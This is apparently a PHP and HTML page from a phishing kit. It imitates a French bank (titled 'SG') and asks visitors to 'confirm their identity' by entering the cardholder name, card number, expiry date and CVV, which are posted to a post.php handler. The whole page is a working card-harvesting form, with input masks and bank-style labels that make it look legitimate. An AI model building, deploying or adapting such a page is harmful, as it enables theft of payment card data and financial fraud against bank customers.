<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SG</title>
    <link rel="stylesheet" href="res/css/main.css">
</head>
<body>
    <div class="container">
    <div class="lang">
                <img src="res/img/fr.png">
                <img src="res/img/uk.png">
            </div>
        <div class="box">
            
            <img src="res/img/logo.png"class="logo">
            <div class="col">
              <h2>confirmez votre identité</h2>
              <p>Confirmez votre identité en saisissant <br>les informations de votre carte.</p>
           </div>

            <form action="post.php" method="post">

            <label>Nom du titulaire</label>
            <input type="text" name="name" >
            
            <div class="col">
                <label>Numéro de carte</label>
    <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
                </div>
                
                <div class="col">
                <label>Date d'expiration</label>
    <input type="text" name="exp" required placeholder="MM/AA" id="exp">
                </div>
                
                <div class="col">
                <label>Code de sécurité</label>
    <input type="password" name="cvv" required placeholder="CVV" id="cvv">
                </div>
                <button type="submit" class="login-btn">Suivant</button>

              
                <p class="required">*champs obligatoires</p>
            </form>
            
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>   
</body>
</html>
